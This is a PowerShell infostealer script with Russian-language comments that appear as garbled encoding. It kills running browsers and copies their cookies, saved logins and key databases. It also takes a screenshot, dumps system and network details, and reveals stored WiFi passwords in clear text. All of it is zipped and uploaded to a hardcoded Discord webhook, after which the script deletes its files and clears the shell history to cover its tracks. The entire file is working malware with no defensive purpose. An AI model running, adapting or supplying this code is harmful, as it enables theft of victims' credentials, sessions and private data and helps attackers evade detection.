# –ñ–µ—Å—Ç–∫–∞—è —Ñ–∏–∫—Å–∞—Ü–∏—è –∫–æ–¥–∏—Ä–æ–≤–∫–∏
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$OutputEncoding = [System.Text.Encoding]::UTF8
chcp 65001 | Out-Null

$webhookUrl = "https://discord.com/api/webhooks/1414478841853775943/kcGMtu7PIyl1prt3b47kdqDOrzRNlvKyPX6fpNAx39z0fVYi61a4DjiZUS7r-YQ1UtYD"
$tempDir = $env:TEMP
$zipPath = "$tempDir\system_loot_$(Get-Date -Format 'yyyyMMdd_HHmmss').zip"

# –£–ë–ò–ô–°–¢–í–û –í–°–ï–• –ë–†–ê–£–ó–ï–†–û–í
Write-Host "‚ò†Ô∏è  –£–±–∏–≤–∞–µ–º –≤—Å–µ –ø—Ä–æ—Ü–µ—Å—Å—ã –±—Ä–∞—É–∑–µ—Ä–æ–≤..." -ForegroundColor Red
Get-Process | Where-Object {$_.ProcessName -match "(chrome|msedge|brave|firefox|yandex|opera|vivaldi)"} | Stop-Process -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 2

# –°–û–ó–î–ê–ï–ú –í–†–ï–ú–ï–ù–ù–£–Æ –ü–ê–ü–ö–£ –î–õ–Ø –°–ë–û–†–ê –î–ê–ù–ù–´–•
$lootDir = "$tempDir\loot_$(Get-Random)"
New-Item -ItemType Directory -Path $lootDir -Force | Out-Null

# === 1. –°–ö–†–ò–ù–®–û–¢ –≠–ö–†–ê–ù–ê ===
Write-Host "üì∏ –î–µ–ª–∞–µ–º —Å–∫—Ä–∏–Ω—à–æ—Ç..." -ForegroundColor Yellow
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
$screenshotPath = "$lootDir\screenshot.png"
$bitmap.Save($screenshotPath, [System.Drawing.Imaging.ImageFormat]::Png)
$graphics.Dispose()
$bitmap.Dispose()

# === 2. –í–û–†–û–í–°–¢–í–û COOKIES –ò –î–ê–ù–ù–´–• –ë–†–ê–£–ó–ï–†–û–í ===
Write-Host "üç™ –í–æ—Ä—É–µ–º cookies –∏ –¥–∞–Ω–Ω—ã–µ..." -ForegroundColor Yellow

$browserPaths = @(
    "$env:LOCALAPPDATA\BraveSoftware",
    "$env:LOCALAPPDATA\Microsoft\Edge", 
    "$env:LOCALAPPDATA\Google\Chrome",
    "$env:LOCALAPPDATA\Yandex",
    "$env:LOCALAPPDATA\Opera Software",
    "$env:LOCALAPPDATA\Vivaldi",
    "$env:APPDATA\Mozilla"
)

foreach ($basePath in $browserPaths) {
    if (Test-Path $basePath) {
        $dataFiles = Get-ChildItem $basePath -Recurse -ErrorAction SilentlyContinue | 
                   Where-Object { $_.Name -match "(Cookies|Login Data|Web Data|History|Bookmarks|Preferences|Secure Preferences|Local State|places\.sqlite|key4\.db|logins\.json|cookies\.sqlite)" } |
                   Where-Object { $_.Length -lt 50MB } | # –ù–µ —Ç—Ä–æ–≥–∞–µ–º –æ–≥—Ä–æ–º–Ω—ã–µ —Ñ–∞–π–ª—ã
                   Select-Object -First 50
        
        foreach ($file in $dataFiles) {
            try {
                $destDir = "$lootDir\browsers\$($file.Directory.Name)"
                New-Item -ItemType Directory -Path $destDir -Force | Out-Null
                Copy-Item $file.FullName -Destination "$destDir\$($file.Name)" -Force
            } catch {
                Write-Host "–û—à–∏–±–∫–∞ –∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∏—è: $($file.FullName)" -ForegroundColor Red
            }
        }
    }
}

# === 3. –ò–ù–§–û–†–ú–ê–¶–ò–Ø –û –°–ò–°–¢–ï–ú–ï ===
Write-Host "üíª –°–æ–±–∏—Ä–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Å–∏—Å—Ç–µ–º–µ..." -ForegroundColor Yellow

$systemInfo = @"
=== üî• –ü–û–õ–ù–´–ô –î–ê–ú–ü –°–ò–°–¢–ï–ú–´ ===

üíÄ –ò–ù–§–û–†–ú–ê–¶–ò–Ø –û –ö–û–ú–ü–¨–Æ–¢–ï–†–ï:
–ò–º—è –∫–æ–º–ø—å—é—Ç–µ—Ä–∞: $env:COMPUTERNAME
–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: $env:USERNAME
–î–æ–º–µ–Ω: $env:USERDOMAIN
–í—Ä–µ–º—è —Å–∏—Å—Ç–µ–º—ã: $(Get-Date)

‚ö° –ê–ü–ü–ê–†–ê–¢–ù–û–ï –û–ë–ï–°–ü–ï–ß–ï–ù–ò–ï:
–ü—Ä–æ—Ü–µ—Å—Å–æ—Ä: $((Get-WmiObject Win32_Processor).Name)
–ü–∞–º—è—Ç—å: $([math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory/1GB,2)) GB
–í–∏–¥–µ–æ–∫–∞—Ä—Ç–∞: $((Get-WmiObject Win32_VideoController).Name)

üåê –°–ï–¢–ï–í–ê–Ø –ò–ù–§–û–†–ú–ê–¶–ò–Ø:
IP –∞–¥—Ä–µ—Å–∞:
$((Get-NetIPAddress | Where-Object {$_.AddressFamily -eq 'IPv4' -and $_.IPAddress -ne '127.0.0.1'} | ForEach-Object { "  - $($_.IPAddress)" }) -join "`n")

DNS —Å–µ—Ä–≤–µ—Ä—ã:
$((Get-DnsClientServerAddress | Where-InterfaceType Ethernet | Select-Object -ExpandProperty ServerAddresses) -join ", ")

üì∂ –°–ï–¢–ï–í–´–ï –°–û–ï–î–ò–ù–ï–ù–ò–Ø:
–ê–∫—Ç–∏–≤–Ω—ã–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è:
$(Get-NetTCPConnection | Where-Object {$_.State -eq 'Established'} | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort | Format-Table -AutoSize | Out-String)

üñ•Ô∏è  –ü–†–û–¶–ï–°–°–´:
–¢–æ–ø –ø—Ä–æ—Ü–µ—Å—Å–æ–≤ –ø–æ –ø–∞–º—è—Ç–∏:
$(Get-Process | Sort-Object WS -Descending | Select-Object -First 10 | Format-Table Name, CPU, WS, Id -AutoSize | Out-String)

üîß –°–ò–°–¢–ï–ú–ù–´–ï –ù–ê–°–¢–†–û–ô–ö–ò:
–í–µ—Ä—Å–∏—è OS: $(Get-WmiObject Win32_OperatingSystem).Caption
–°–±–æ—Ä–∫–∞: $(Get-WmiObject Win32_OperatingSystem).Version
–õ–æ–∫–∞–ª—å–Ω—ã–π –¥–∏—Å–∫:
$(Get-WmiObject Win32_LogicalDisk | Where-Object {$_.DriveType -eq 3} | ForEach-Object { "  $($_.DeviceID) - $([math]::Round($_.FreeSpace/1GB,2)) GB —Å–≤–æ–±–æ–¥–Ω–æ –∏–∑ $([math]::Round($_.Size/1GB,2)) GB" })

=== üö® –ö–û–ù–ï–¶ –î–ê–ú–ü–ê ===
"@

$systemInfo | Out-File -Encoding UTF8 "$lootDir\system_info.txt"

# === 4. –ò–ù–§–û–†–ú–ê–¶–ò–Ø –û –ò–ù–¢–ï–†–ù–ï–¢–ï ===
Write-Host "üåê –°–æ–±–∏—Ä–∞–µ–º —Å–µ—Ç–µ–≤—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é..." -ForegroundColor Yellow

$networkInfo = @"
=== üåê –ü–û–õ–ù–ê–Ø –°–ï–¢–ï–í–ê–Ø –ò–ù–§–û–†–ú–ê–¶–ò–Ø ===

üì° WiFi —Å–µ—Ç–∏:
$(netsh wlan show profiles | Where-Object {$_ -match "–í—Å–µ –ø—Ä–æ—Ñ–∏–ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è"} | ForEach-Object {
    $ssid = $_.Split(":")[1].Trim()
    $password = (netsh wlan show profile name="$ssid" key=clear | Where-Object {$_ -match "–°–æ–¥–µ—Ä–∂–∏–º–æ–µ –∫–ª—é—á–∞"}) -split ":"[1]
    "SSID: $ssid | Password: $password"
})

üåê DNS –∫—ç—à:
$(Get-DnsClientCache | Select-Object -First 20 | Format-Table Entry, Name, Data -AutoSize | Out-String)

üîå ARP —Ç–∞–±–ª–∏—Ü–∞:
$(Get-NetNeighbor | Where-Object {$_.State -eq 'Reachable'} | Select-Object -First 15 | Format-Table IPAddress, LinkLayerAddress, State -AutoSize | Out-String)

üìä –°–µ—Ç–µ–≤—ã–µ –∞–¥–∞–ø—Ç–µ—Ä—ã:
$(Get-NetAdapter | Where-Object {$_.Status -eq 'Up'} | Format-Table Name, InterfaceDescription, LinkSpeed -AutoSize | Out-String)
"@

$networkInfo | Out-File -Encoding UTF8 "$lootDir\network_info.txt"

# === 5. –°–û–ó–î–ê–ï–ú –ï–ë–£–ß–ò–ô –ê–†–•–ò–í ===
Write-Host "üóúÔ∏è  –°–æ–∑–¥–∞–µ–º –∞—Ä—Ö–∏–≤ —Å–æ –≤—Å–µ–º –¥–æ–±—Ä–æ–º..." -ForegroundColor Yellow

try {
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    [System.IO.Compression.ZipFile]::CreateFromDirectory($lootDir, $zipPath, [System.IO.Compression.CompressionLevel]::Optimal, $false)
} catch {
    # –†–µ–∑–µ—Ä–≤–Ω—ã–π –º–µ—Ç–æ–¥ —á–µ—Ä–µ–∑ 7zip –µ—Å–ª–∏ —Å–∏—Å—Ç–µ–º–Ω—ã–π –Ω–µ —Ä–∞–±–æ—Ç–∞–µ—Ç
    if (Test-Path "$env:ProgramFiles\7-Zip\7z.exe") {
        & "$env:ProgramFiles\7-Zip\7z.exe" a -tzip $zipPath "$lootDir\*" -r
    }
}

# === 6. –û–¢–ü–†–ê–í–ö–ê –í DISCORD ===
Write-Host "üì§ –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤—Å–µ –Ω–∞—Ö—É–π –≤ Discord..." -ForegroundColor Green

function Send-FileToDiscord {
    param($filePath, $message)
    
    $boundary = [System.Guid]::NewGuid().ToString()
    $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
    $fileName = [System.IO.Path]::GetFileName($filePath)

    $body = @"
--$boundary
Content-Disposition: form-data; name="file"; filename="$fileName"
Content-Type: application/octet-stream

$([System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes))
--$boundary
Content-Disposition: form-data; name="content"

$message
--$boundary--
"@

    try {
        Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body
        Write-Host "‚úÖ –£—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ: $fileName" -ForegroundColor Green
    } catch {
        Write-Host "‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏: $($_.Exception.Message)" -ForegroundColor Red
    }
}

# –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∞—Ä—Ö–∏–≤
if (Test-Path $zipPath) {
    $fileSize = [math]::Round((Get-Item $zipPath).Length/1MB, 2)
    $message = @"
üö® **SYSTEM LOOT COLLECTED** üö®

üì¶ Archive Size: ${fileSize}MB
üíª User: $env:USERNAME@$env:COMPUTERNAME  
üåê IP: $(Get-NetIPAddress | Where-Object {$_.AddressFamily -eq 'IPv4' -and $_.IPAddress -ne '127.0.0.1'} | Select-Object -First 1 -ExpandProperty IPAddress)
üïê Time: $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")

Contents:
‚úÖ Screenshot
‚úÖ Browser Cookies & Data  
‚úÖ Full System Info
‚úÖ Network Config
‚úÖ WiFi Passwords
‚úÖ DNS Cache
‚úÖ Process List
"@

    Send-FileToDiscord -filePath $zipPath -message $message
}

# === 7. –ó–ê–ß–ò–°–¢–ö–ê –°–õ–ï–î–û–í ===
Write-Host "üßπ –£–Ω–∏—á—Ç–æ–∂–∞–µ–º —Å–ª–µ–¥—ã..." -ForegroundColor Yellow

# –£–¥–∞–ª—è–µ–º –≤—Ä–µ–º–µ–Ω–Ω—ã–µ —Ñ–∞–π–ª—ã
Remove-Item -Path $lootDir -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path $zipPath -Force -ErrorAction SilentlyContinue

# –û—á–∏—â–∞–µ–º –∏—Å—Ç–æ—Ä–∏—é PowerShell
Clear-History

Write-Host "üéØ –ì–æ—Ç–æ–≤–æ! –í—Å–µ –¥–∞–Ω–Ω—ã–µ –±—ã–ª–∏ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã." -ForegroundColor Green
Write-Host "üìä –£–∫—Ä–∞–¥–µ–Ω–æ: Cookies, —Å–∫—Ä–∏–Ω—à–æ—Ç, —Å–∏—Å—Ç–µ–º–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è, —Å–µ—Ç–µ–≤—ã–µ –¥–∞–Ω–Ω—ã–µ" -ForegroundColor Cyan